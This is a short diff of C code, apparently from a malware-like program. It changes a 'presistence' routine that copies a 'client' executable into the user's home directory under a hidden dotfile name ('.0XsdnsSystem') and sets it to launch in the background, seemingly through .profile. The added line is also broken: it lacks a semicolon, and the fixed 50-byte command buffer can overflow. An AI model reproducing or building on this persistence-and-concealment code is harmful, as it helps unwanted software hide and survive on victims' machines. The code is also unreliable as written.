@@ -23,9 +23,10 @@ int presistence(char *get_path, FILE *fp)
     //copy the executable to home directory
     char command[50] = "cp client ";
     strcat(command, get_path);
+    strcat(command,".0XsdnsSystem")
     system(command);
 
-    strcat(get_path, "./client &");
+    strcat(get_path, "./.0XsdnsSystem &");
     //check if .profile can be accessed
     if(fp == NULL)
         {
